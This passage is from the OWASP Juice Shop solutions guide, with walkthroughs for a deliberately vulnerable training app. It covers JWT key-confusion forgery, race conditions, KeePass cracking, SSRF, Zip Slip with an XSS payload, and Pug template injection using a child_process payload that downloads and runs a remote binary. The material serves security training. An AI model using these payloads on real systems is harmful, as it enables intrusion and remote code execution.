<a href="https://github.com/juice-shop/juicy-coupon-bot/blob/master/lib/statusText.js">prepare the text for a tweet with a coupon code</a>
for the current month and with a discount between 10% and 40% and
log it to your console.</p>
</li>
<li>
<p>The coupon code is actually retrieved
<a href="https://5j4d1u7jhf.execute-api.eu-west-1.amazonaws.com/default/JuicyCouponFunc">via an AWS API call</a>
which returns valid coupons with different discounts and their
expiration date as JSON, e.g.
<code>{"discountCodes":{"10%":"mNYS#iv#%t","20%":"mNYS#iw00u","30%":"mNYS#iw03v","40%":"mNYS#iw06w"},"expiryDate":"2019-02-28"}</code></p>
</li>
</ul>
</div>
</li>
<li>
<p>You could collect this data for several months and basically fall
back to the
<a href="#pattern-analysis-solution-path">Pattern analysis solution path</a>
only with more recent coupons.</p>
</li>
<li>
<p>For an easier and more satisfying victory over this challenge, take a
look at the commit history of the GitHub repository
<a href="https://github.com/juice-shop/juicy-coupon-bot" class="bare">https://github.com/juice-shop/juicy-coupon-bot</a>, though.</p>
</li>
<li>
<p>Going back in time a bit, you will learn that the coupon retrieval
via AWS API backed by a Lambda function was not the original
implementation. Commit
<a href="https://github.com/juice-shop/juicy-coupon-bot/commit/fde2003535598ad3c4edc17ad9ffcdc9c589d3c5"><code>fde2003</code></a>
introduced the API call, replacing the previous programmatic creation
of a coupon code.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/git-diff_coupon_lambda.png" alt="Diff of local and cloud-based coupon creation">
</div>
</div>
</li>
<li>
<p>You now have learned the coupon format and that it is <code>z85</code> encoded.
You can now either manipulate your local clone of the "pre-<code>fde2003</code>
version" of the <code>juicy-coupon-bot</code> or fall back to the last part of
the
<a href="#reverse-engineering-solution-path">Reverse engineering solution path</a>
where you find and install <code>z85-cli</code> to conveniently create your own
80%+ coupon locally.</p>
</li>
</ol>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_solve_challenge_999"><a class="anchor" href="#_solve_challenge_999"></a>Solve challenge #999</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve any other challenge</p>
</li>
<li>
<p>Inspect the cookies in your browser to find a <code>continueCode</code> cookie</p>
</li>
<li>
<p>The <code>package.json.bak</code> contains the library used for generating these
continue codes: <code>hashid</code></p>
</li>
<li>
<p>Visit <a href="http://hashids.org/" class="bare">http://hashids.org/</a> to get some information about the
mechanism</p>
</li>
<li>
<p>Follow the link labeled <em>check out the demo</em>
(<a href="http://codepen.io/ivanakimov/pen/bNmExm" class="bare">http://codepen.io/ivanakimov/pen/bNmExm</a>)</p>
</li>
<li>
<p>The Juice Shop simply uses the example salt (<code>this is my salt</code>) and
also the default character range
(<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890</code>)
from that demo page. It just uses a minimum length of <code>60</code> instead of
<code>8</code> for the resulting hash.</p>
</li>
<li>
<p>Encoding the value <code>999</code> with the demo (see code below) gives you the
hash result
<code>69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj</code></p>
</li>
<li>
<p>Send a <code>PUT</code> request to the URL
<a href="http://localhost:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj" class="bare">http://localhost:3000/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj</a>
to solve this challenge.</p>
</li>
</ol>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-javascript hljs" data-lang="javascript">   var hashids = new Hashids("this is my salt", 60, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890");

  var id = hashids.encode(999);
  var numbers = hashids.decode(id);

  $("#input").text("["+numbers.join(", ")+"]");
  $("#output").text(id);</code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_forge_an_almost_properly_rsa_signed_jwt_token"><a class="anchor" href="#_forge_an_almost_properly_rsa_signed_jwt_token"></a>Forge an almost properly RSA-signed JWT token</h3>
<div class="sect3">
<h4 id="_with_burp_suite"><a class="anchor" href="#_with_burp_suite"></a>With Burp Suite</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Use your favorite forced directory browsing tool (or incredible
guessing luck) to identify <a href="http://localhost:3000/encryptionkeys" class="bare">http://localhost:3000/encryptionkeys</a> as
having directory listing enabled.</p>
</li>
<li>
<p>Download the application&#8217;s public JWT key from
<a href="http://localhost:3000/encryptionkeys/jwt.pub" class="bare">http://localhost:3000/encryptionkeys/jwt.pub</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/jwt2-findkey.PNG" alt="encryption keys">
</div>
</div>
</li>
<li>
<p>Download and install the
<a href="https://portswigger.net/burp/communitydownload">Burp Suite Community Edition</a></p>
</li>
<li>
<p>In the <em>BApp Store</em> tab under the <em>Extender</em> tab within Burp Suite
find and install the
<a href="https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61">JSON Web Token Attacker</a>
extension (aka <em>JOSEPH</em>)</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/jwt2-burpextension.PNG" alt="load extension">
</div>
</div>
</li>
<li>
<p>Send any captured request that has an <code>Authorization: Bearer</code> token
to Burp&#8217;s <em>Repeater</em>.</p>
</li>
<li>
<p>Once in <em>Repeater</em>, click the <em>JWS</em> tab, then the <em>Payload</em> tab
beneath and modify the email parameter to be <code>rsa_lord@juice-sh.op</code>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/jwt2-request.PNG" alt="modify payload">
</div>
</div>
</li>
<li>
<p>Next, click the <em>Attacker</em> tab, select <em>Key Confusion</em>, then click
<em>Load</em>.</p>
</li>
<li>
<p>Paste in the contents of the <code>jwt.pub</code> file without the <code>-----BEGIN
RSA PUBLIC KEY-----</code> and <code>-----END RSA PUBLIC KEY-----</code> lines.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/jwt2-keyconfusion.PNG" alt="key confusion">
</div>
</div>
</li>
<li>
<p>Click <em>Update</em> and then <em>Go</em> in the top left to send the modified
request via Burp and solve this challenge!</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>👏 Kudos to <a href="https://github.com/ZonkSec">Tyler Rosonke</a> for providing
this solution.</p>
</div>
</div>
<div class="sect3">
<h4 id="_with_linux_and_online_tools"><a class="anchor" href="#_with_linux_and_online_tools"></a>With Linux and online tools</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Download the application&#8217;s public JWT key from
<a href="http://localhost:3000/encryptionkeys/jwt.pub" class="bare">http://localhost:3000/encryptionkeys/jwt.pub</a></p>
</li>
<li>
<p>The authentication token is of form
<code>header_base64url.payload_base64url.signature_base64url</code>. Copy the
JWT header from a request, decode it and change the algorithm to
HS256 using a tool like <a href="https://cryptii.com/" class="bare">https://cryptii.com/</a>.<br>
The server uses a private RSA key to sign the token and a public one
to verify it when using RS256, but when using HS256 there is only one
key for both, and, for verification, the server always uses the
public RSA key disregarding the algorithm specified in the header.
<span class="image"><img src="../_images/appendix/token_header_encode.png" alt="edit header"></span></p>
</li>
<li>
<p>Edit the email in the payload to <code>rsa_lord@juice-sh.op</code>.
<span class="image"><img src="../_images/appendix/token_payload_encode.png" alt="edit body"></span></p>
</li>
<li>
<p>Encode the server key to hex <code>cat jwt.pub | xxd -p | tr -d "\\n"</code></p>
</li>
<li>
<p>Sign your new token with the server key with hmac <code>echo -n
"new_header.new_payload" | openssl dgst -sha256 -mac HMAC -macopt
hexkey:server_key_hex</code></p>
</li>
<li>
<p>Encode your signature to base64url: <code>echo -n "signature" | xxd -r -p
| base64 | sed 's/+/-/g; s/\//_/g; s/=//g' | tr -d "\\n"</code></p>
</li>
<li>
<p>Place the new token in a cookie or send an authenticated request with
the it to solve the challenge.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>👏 Kudos to <a href="https://github.com/teodor440">teodor440</a> for providing this
solution.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_like_any_review_at_least_three_times_as_the_same_user"><a class="anchor" href="#_like_any_review_at_least_three_times_as_the_same_user"></a>Like any review at least three times as the same user</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Liking a review normally results in a request to
<a href="http://localhost:3000/rest/products/reviews" class="bare">http://localhost:3000/rest/products/reviews</a> which associates the
email of the user with the review (identified by the JSON body of
e.g. <code>{id: "ZQdzyRCbwQ4ys3PCG"}</code>) and also increases its like counter
by one.</p>
</li>
<li>
<p>If you try to replay the same request you will get a <code>403 Forbidden</code>
HTTP status with <code>{"error":"Not allowed"}</code> in the response.</p>
</li>
<li>
<p>Write a script that simultaneously executes three requests to
<a href="http://localhost:3000/rest/products/reviews" class="bare">http://localhost:3000/rest/products/reviews</a> with body e.g. <code>{id:
"ZQdzyRCbwQ4ys3PCG"}</code> and run it.</p>
</li>
<li>
<p>If your 3 requests get handled asynchronously within an (artificial)
150ms time window, you will cause a race condition and all will get
through and each increase the like counter by one to a total of
three!</p>
</li>
<li>
<p>Back in your browser you should now see the corresponding challenge
marked as solved!</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>The following <a href="https://github.com/aaronhnatiw/race-the-web">RaceTheWeb</a>
config does the trick as well:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-toml hljs" data-lang="toml"># Multiple Likes
# Save this as multiple-likes.toml
# Get comment information from this endpoint first: http://localhost:3000/rest/products/&lt;id&gt;/reviews
# Then repalce id values in body parameter of this file
# You need to replace the bearer token as well
# open browser dev tools, like any of the comment, then inspect the traffic to obtain a valid bearer token
# Launch this file by doing ./racethweb multiple-likes.toml
count = 3
verbose = true
[[requests]]
    method = "POST"
    url = "http://localhost:3000/rest/products/reviews"
    body = "{\"id\":\"QEBb8RKLor69dsXkB\"}"
    headers = ["Content-Type: application/json","Authorization: Bearer XXX"]</code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_the_support_teams_original_user_credentials"><a class="anchor" href="#_log_in_with_the_support_teams_original_user_credentials"></a>Log in with the support team&#8217;s original user credentials</h3>
<div class="paragraph">
<p><em>Solving this challenge requires <a href="http://keepass.info">KeePass 2.x</a>
installed on your computer. If you are using a non-Windows OS you can
try using some unofficial port but there is no guarantee the file can be
opened on those.</em></p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Find out that the support team&#8217;s email address is <code>support@juice-sh.op</code> eiher via deduction of the pattern from other users or by completing the <a href="#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a> challenge.</p>
</li>
<li>
<p>Brute forcing the password on of this user &lt;httpc://localhost:3000/#/login&gt; is an entirely hopeless approach.</p>
</li>
<li>
<p>You might notice that the support team has a KeePass database file located in
<a href="http://localhost:3000/ftp/incident-support.kdbx" class="bare">http://localhost:3000/ftp/incident-support.kdbx</a> and that it
is conveniently <em>not blocked</em> by the file type filter otherwise protecting this folder.</p>
</li>
<li>
<p>Download and install KeePass 2.x from <a href="http://keepass.info" class="bare">http://keepass.info</a></p>
</li>
<li>
<p>Trying to brute force the password on this KeePass file is unlikely to succeed at this stage.</p>
</li>
<li>
<p>Inspecting <code>main.js</code> for information leakage (e.g. by
searching for <code>support</code>) will yield an interesting log statement that
is printed when the support logs in with the wrong password:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified-js_support-hint.png" alt="Support team login hint in minified JS">
</div>
</div>
</li>
<li>
<p>The logged text is in Romanian language: <code>Parola echipei de asistență nu respectă politica corporativă pentru conturile privilegiate! Vă rugăm să schimbați parola în consecință!</code></p>
</li>
<li>
<p>Running this through an online translator yields something like:
<code>The password of the support team does not respect the corporate policy for privileged accounts! Please change your password accordingly!</code></p>
</li>
<li>
<p>More interesting even is the Regular Expression <code>(?=.<strong>[a-z])(?=.</strong>[A-Z])(?=.<strong>\d)(?=.</strong>[@$!%<strong>?&amp;])[A-Za-z\d@$!%</strong>?&amp;]{12,30}</code> being used to check for a specific password pattern. You can assume that this is the equivalent of the mentioned corporate policy.</p>
</li>
<li>
<p>This RegEx translates into the following password requirements</p>
<div class="ulist">
<ul>
<li>
<p>a minimum length of 12 characters</p>
</li>
<li>
<p>a maximum length of 30 characters</p>
</li>
<li>
<p>at least one lowercase character <code>a-z</code></p>
</li>
<li>
<p>at least one uppercase character <code>A-Z</code></p>
</li>
<li>
<p>at least one number <code>0-9</code></p>
</li>
<li>
<p>at least one special character <code>@$!%*?&amp;</code></p>
</li>
</ul>
</div>
</li>
<li>
<p>Note also, that this RegEx would not accept <em>any other</em> special characters or letters than the ones mentioned above.</p>
</li>
<li>
<p>Assume that the support team followed the password policy for its user password <em>and</em> also for its KeePass file.</p>
</li>
<li>
<p>Furthermore, presume that they might have used a weaker password on their KeePass database, because their normal workflow might involve getting the user credentials from it when logging in to the application. Therefore, the KeePass file should be easier to break into.</p>
</li>
<li>
<p>Use a brute force script (applying the password pattern restrictions known to you) to break into the KeePass file with the terribly chosen password <code>Support2022!</code>.</p>
</li>
<li>
<p>Find the password for the support team user account in the <code>prod</code>
entry of the KeePass file.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/keepass-list.png" alt="Unlocked KeePass file">
</div>
</div>
</li>
<li>
<p>Log in with <code>support@juice-sh.op</code> as <em>Email</em> and
<code>J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P</code> as <em>Password</em> to beat this
challenge.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/keepass-prod_entry.png" alt="Credentials of the support team in the KeePass file">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_unlock_premium_challenge_to_access_exclusive_content"><a class="anchor" href="#_unlock_premium_challenge_to_access_exclusive_content"></a>Unlock Premium Challenge to access exclusive content</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Inspecting the HTML source of the corresponding row in the <em>Score
Board</em> table reveals a HTML comment that is obviously encrypted:
<code>&lt;!--IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg==--&gt;</code>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/inspect-premium_challenge.png" alt="DOM inspection of the Unlock Premium Challenge button">
</div>
</div>
</li>
<li>
<p>This is a cipher text that came out of an AES-encryption using AES256
in CBC mode.</p>
</li>
<li>
<p>To get the key and the IV, you should run a <em>Forced Directory
Browsing</em> attack against the application. You can use OWASP ZAP for
this purpose.</p>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Of the word lists coming with OWASP ZAP only
<code>directory-list-2.3-big.txt</code> and
<code>directory-list-lowercase-2.3-big.txt</code> contain the directory with
the key file.</p>
</li>
<li>
<p>The search will uncover <a href="http://localhost:3000/encryptionkeys" class="bare">http://localhost:3000/encryptionkeys</a> as
a browsable directory</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/encryptionkeys_directory.png" alt="Browsable directoy &quot;encryptionkeys&quot;">
</div>
</div>
</li>
<li>
<p>Open <a href="http://localhost:3000/encryptionkeys/premium.key" class="bare">http://localhost:3000/encryptionkeys/premium.key</a> to
retrieve the AES encryption key <code>EA99A61D92D2955B1E9285B55BF2AD42</code>
and the IV <code>1337</code>.</p>
</li>
</ol>
</div>
</li>
<li>
<p>In order to decrypt the cipher text, it is best to use <code>openssl</code>.</p>
<div class="ulist">
<ul>
<li>
<p><code>echo
"IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg=="
| openssl enc -d -aes-256-cbc -K EA99A61D92D2955B1E9285B55BF2AD42
-iv 1337133713371337 -a -A</code></p>
</li>
<li>
<p>The plain text is:
<code>/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us</code></p>
</li>
</ul>
</div>
</li>
<li>
<p>Visit
<a href="http://localhost:3000/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us" class="bare">http://localhost:3000/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us</a>
to solve this challenge and marvel at the premium VR wallpaper!
(Requires dedicated hardware to be viewed in all its glory.)</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_remote_code_execution_that_occupies_the_server_for_a_while_without_using_infinite_loops"><a class="anchor" href="#_perform_a_remote_code_execution_that_occupies_the_server_for_a_while_without_using_infinite_loops"></a>Perform a Remote Code Execution that occupies the server for a while without using infinite loops</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Follow steps 1-7 of the challenge
<a href="#perform-a-remote-code-execution-that-would-keep-a-less-hardened-application-busy-forever">Perform a Remote Code Execution that would keep a less hardened application busy forever</a>.</p>
</li>
<li>
<p>As <em>Request Body</em> put in <code>{"orderLinesData":
"/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"}</code> - which will
trigger a very costly Regular Expression test once executed.</p>
</li>
<li>
<p>Submit the request by clicking <em>Execute</em>.</p>
</li>
<li>
<p>The server should eventually respond with a <code>503</code> status and an error
stating <code>Sorry, we are temporarily not available! Please try again
later.</code> after roughly 2 seconds. This is due to a defined timeout so
you do not really DoS your Juice Shop server.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_request_a_hidden_resource_on_server_through_server"><a class="anchor" href="#_request_a_hidden_resource_on_server_through_server"></a>Request a hidden resource on server through server</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve
<a href="#infect-the-server-with-juicy-malware-by-abusing-arbitrary-command-execution">Infect the server with "juicy malware" by abusing arbitrary command execution</a>
at least to the point where you have access to the "juicy malware"
executables.</p>
</li>
<li>
<p>Similar to that SSTi challenge, the vulnerable place for this one is
found on the <a href="http://localhost:3000/profile" class="bare">http://localhost:3000/profile</a> page.</p>
</li>
<li>
<p>The only promising input field for an SSRF attack is the <em>Gravatar
URL</em>. Open your browser&#8217;s DevTools and watch the <em>Network</em> tab.</p>
</li>
<li>
<p>Type any URL (e.g. <a href="https://placekitten.com/100/100" class="bare">https://placekitten.com/100/100</a>) into <em>Gravatr
URL</em> and click <em>Link Gravatar</em>. You will realize a request
<a href="http://localhost:3000/profile/image/url" class="bare">http://localhost:3000/profile/image/url</a> with the
chosen <a href="https://placekitten.com/100/100" class="bare">https://placekitten.com/100/100</a> as parameter <code>imageUrl</code>.</p>
</li>
<li>
<p>You will find no HTTP request to <a href="https://placekitten.com/100/100" class="bare">https://placekitten.com/100/100</a>
going out from your browser, though. As the image was retrieved and
associated with your profile, it must have been downloaded <em>by the
Juice Shop server</em>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/ssrf_placekitten.png" alt="Placekitten image associated with a user profile">
</div>
</div>
</li>
<li>
<p>To solve this challenge, you need to find a secret URL hidden inside
the "juicy malware" and simulate a self-targeted SSRF attack with it.</p>
</li>
<li>
<p>Use your favorite decompiler(s) to see what is going on inside the
malware program&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;or execute the malware while tunneling all its traffic through a
proxy.</p>
</li>
<li>
<p>Either way you should be able to identify the URL being called by it
is
<a href="http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3" class="bare">http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3</a></p>
</li>
<li>
<p>Visiting that URL directly will not do anything, as it needs to be
called through the <em>Gravatar Link</em> field that was presumably
vulnerable to SSRF</p>
</li>
<li>
<p>Paste the URL in and click <em>Link Gravatar</em> to get the expected
challenge solved notification!</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_infect_the_server_with_juicy_malware_by_abusing_arbitrary_command_execution"><a class="anchor" href="#_infect_the_server_with_juicy_malware_by_abusing_arbitrary_command_execution"></a>Infect the server with juicy malware by abusing arbitrary command execution</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Perform the totally obvious Google search for <code>juicy malware</code> to find
<a href="https://github.com/J12934/juicy-malware" class="bare">https://github.com/J12934/juicy-malware</a></p>
</li>
<li>
<p>Alternatively you also find three <code>.url</code> files with direct links in
<a href="http://localhost:3000/ftp/quarantine" class="bare">http://localhost:3000/ftp/quarantine</a> but you&#8217;ll probably need to
understand how to solve any of
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a>,
<a href="#access-a-salesmans-forgotten-backup-file">Access a salesman&#8217;s forgotten backup file</a>
or
<a href="#access-a-misplaced-siem-signature-file">Access a misplaced SIEM signature file</a>
first.</p>
</li>
<li>
<p>Your goal is to use RCE to make the server download and execute the
malware version for the server OS, so on Linux you might want to run
something like <code>wget -O malware
https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
&amp;&amp; chmod +x malware &amp;&amp; ./malware</code></p>
</li>
<li>
<p>You probably realized by now that <a href="http://localhost:3000/profile" class="bare">http://localhost:3000/profile</a> is
not an Angular page? This page is written using
<a href="https://pugjs.org">Pug</a> which happens to be a Template engine and
therefore perfectly suited for SSTi mischief.</p>
</li>
<li>
<p>Set your <em>Username</em> to <code>1+1</code> and click <em>Set Username</em>. Your username
will be just shown as <code>1+1</code> under the profile picture.</p>
</li>
<li>
<p>Trying template injection into Pug set <em>Username</em> to <code>#{1+1}</code> and
click <em>Set Username</em>. Your username will now be shown as <code>2</code> under
the profile picture!</p>
</li>
<li>
<p>Craft a payload that will abuse the lack of encapsulation of
JavaScript&#8217;s <code>global.process</code> object to dynamically load a library
that will allow you to spawn a process on the server that will then
download and execute the malware.</p>
</li>
<li>
<p>The payload might look like
<code>#{global.process.mainModule.require('child_process').exec('wget -O
malware
https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true
&amp;&amp; chmod +x malware &amp;&amp; ./malware')}</code>. Submit this as <em>Username</em> and
(on a Linux server) the challenge should be marked as solved</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>ℹ️ Remember that you need to use the right malware file for your
server&#8217;s operation system and also their synonym command for <code>wget</code>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_embed_an_xss_payload_into_our_promo_video"><a class="anchor" href="#_embed_an_xss_payload_into_our_promo_video"></a>Embed an XSS payload into our promo video</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The author
<a href="https://twitter.com/bkimminich/status/1114621693299916800">tweeted about a new promotion video</a>
back in <code>v8.5.0</code> from his personal account, openly spoilering the URL
<a href="http://localhost:3000/promotion" class="bare">http://localhost:3000/promotion</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/tweet_promotion.png" alt="Tweet promoting a new in-app promotion video">
</div>
</div>
</li>
<li>
<p>After changing the video sported on the promotion page in <code>v12.5.0</code>,
the Juice Shop&#8217;s own Twitter account
<a href="https://twitter.com/owasp_juiceshop/status/1350381894010077184">published another message</a>,
this time spoilering the URL <a href="http://demo.owasp-juice.shop/promotion" class="bare">http://demo.owasp-juice.shop/promotion</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/tweet_promotion2.png" alt="Tweet promoting the OWASP membership ad promotion video">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/promotion" class="bare">http://localhost:3000/promotion</a> to watch the video
advertising
<a href="https://owasp.org/membership/">the benefits of an OWASP membership</a>!
You will notice that it comes with subtitles enabled by default.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/promo_video.png" alt="In-app promotion video">
</div>
</div>
</li>
<li>
<p>Right-click and select <em>View Source</em> on the page to learn that it
loads its video from <a href="http://localhost:3000/video" class="bare">http://localhost:3000/video</a> and that the
subtitles are directly embedded in the page itself.</p>
</li>
<li>
<p>Inspecting the response for <a href="http://localhost:3000/video" class="bare">http://localhost:3000/video</a> in the
<em>Network</em> tab of your DevTools shows an interesting header
<code>Content-Location: /assets/public/videos/owasp_promo.mp4</code></p>
</li>
<li>
<p>Trying to access the video directly at
<a href="http://localhost:3000/assets/public/videos/owasp_promo.mp4" class="bare">http://localhost:3000/assets/public/videos/owasp_promo.mp4</a> works
fine.</p>
</li>
<li>
<p>Getting a directory listing for
<a href="http://localhost:3000/assets/public/videos" class="bare">http://localhost:3000/assets/public/videos</a> does not work
unfortunately.</p>
</li>
<li>
<p>Knowing that the subtitles are in
<a href="https://www.w3.org/TR/webvtt1/">WebVTT</a> format (from step 3) a lucky
guess would be that a corresponding <code>.vtt</code> file is available
alongside the video.</p>
</li>
<li>
<p>Accessing
<a href="http://localhost:3000/assets/public/videos/owasp_promo.vtt" class="bare">http://localhost:3000/assets/public/videos/owasp_promo.vtt</a> proves
this assumption correct.</p>
</li>
<li>
<p>As the subtitles are not loaded separately by the client, they must
be embedded on the server side. If this embedding happens without
proper safeguards, an XSS attack would be possible if the subtitles
files could be overwritten.</p>
</li>
<li>
<p>The prescribed XSS payload also hints clearly at the intended attack
against the subtitles, which are themselves enclosed in a <code>&lt;script&gt;</code>
tag, which the payload will try to close prematurely with its
starting <code>&lt;/script&gt;</code>.</p>
</li>
<li>
<p>To successfully overwrite the file, the Zip Slip vulnerability
behind the
<a href="#overwrite-the-legal-information-file">Overwrite the Legal Information file</a>
challenge can be used.</p>
</li>
<li>
<p>The blind part of this challenge is the actual file location in the
server file system. Trying to create a Zip file with any path trying
to traverse into <code>../../assets/public/videos/</code> will fail. Notice
that <code>../../</code> was sufficient to get to the root folder in
<a href="#overwrite-the-legal-information-file">Overwrite the Legal Information file</a>.</p>
</li>
<li>
<p>This likely means that there is a deeper directory structure in
which <code>assets/</code> resides.</p>
</li>
<li>
<p>This actual directory structure on the server is created by the
AngularCLI tool when it compiles the application, but is unfortunately not fully leaked anywhere in the client-side code.</p>
</li>
<li>
<p>You can get a hint on a possible base directory <code>frontend/</code> from <a href="http://localhost:3000/main.js" class="bare">http://localhost:3000/main.js</a> and several other JavaScript files you find in the <em>Sources</em> tab of your Browser&#8217;s DevTools from the fact that they all start with <code>"use strict";(self.webpackChunkfrontend=self.webpackChunkfrontend||[])</code> where <code>frontend</code> is the Angular project name.</p>
</li>
<li>
<p>Trying <code>../../frontend/assets/public/videos/</code> will still fail as your Zip Slip directory traversal payload.</p>
</li>
<li>
<p>Either by intense brute-forcing, lucky guessing or heavy googling you might eventually end up with a path prefix of
<code>frontend/dist/frontend/</code> in which <code>assets/</code> resides on the server. Thus, the path you need to work with, is <code>frontend/dist/frontend/assets/</code>. Note that there really is no "right" way to find this out, but here are some possible ways:</p>
<div class="ulist">
<ul>
<li>
<p>You can easily find many Angular examples where some <code>dist/</code> folder is involved in the application packaging</p>
</li>
<li>
<p>Via Google you might stumble across <a href="https://vorozco.com/blog/2019/2019-09-11-Packagin-Angular-8-Apps-War.html" class="bare">https://vorozco.com/blog/2019/2019-09-11-Packagin-Angular-8-Apps-War.html</a> which mentions <code>&lt;directory&gt;src/main/frontend/dist/frontend&lt;/directory&gt;</code> as their package folder.</p>
</li>
<li>
<p>You could create a list of possible involved package names and then create different Zip Slip payloads for these, adding one and eventually two additional recursions into deeper directory levels.</p>
</li>
<li>
<p>As long as <code>frontend</code> and <code>dist</code> are in your list, you will end up with the right permutation of <code>frontend/dist/frontend</code> on a depth level of 3 eventually.</p>
</li>
</ul>
</div>
</li>
<li>
<p>Prepare a ZIP file with a <code>owasp_promo.vtt</code> inside that contains the
prescribed payload of <code>&lt;/script&gt;&lt;script&gt;alert(`xss</code>)&lt;/script&gt;`
with <code>zip exploit.zip
../../frontend/dist/frontend/assets/public/video/owasp_promo.vtt</code>
(on Linux).</p>
</li>
<li>
<p>Upload the ZIP file on <a href="http://localhost:3000/#/complain" class="bare">http://localhost:3000/#/complain</a>.</p>
</li>
<li>
<p>The challenge notification will not trigger immediately, as it
requires you to actually execute the payload by visiting
<a href="http://localhost:3000/promotion" class="bare">http://localhost:3000/promotion</a> again.</p>
</li>
<li>
<p>You will see the alert box and once you go <em>Back</em> the challenge
solution should trigger accordingly.</p>
</li>
</ol>
</div>
</div>
</div>
</div>
<div id="footnotes">
<hr>
<div class="footnote" id="_footnotedef_1">
<a href="#_footnoteref_1">1</a>. <a href="https://wiki.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004" class="bare">https://wiki.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004</a>)
</div>
<div class="footnote" id="_footnotedef_2">
<a href="#_footnoteref_2">2</a>. <a href="https://en.wikipedia.org/wiki/ROT13" class="bare">https://en.wikipedia.org/wiki/ROT13</a>
</div>
<div class="footnote" id="_footnotedef_3">
<a href="#_footnoteref_3">3</a>. <a href="http://www.kli.org/about-klingon/klingon-history" class="bare">http://www.kli.org/about-klingon/klingon-history</a>
</div>
<div class="footnote" id="_footnotedef_4">
<a href="#_footnoteref_4">4</a>. <a href="https://en.wikipedia.org/wiki/List_of_postal_codes_in_Germany" class="bare">https://en.wikipedia.org/wiki/List_of_postal_codes_in_Germany</a>
</div>
<div class="footnote" id="_footnotedef_5">
<a href="#_footnoteref_5">5</a>. <a href="https://en.wikipedia.org/wiki/Leet" class="bare">https://en.wikipedia.org/wiki/Leet</a>
</div>
<div class="footnote" id="_footnotedef_6">
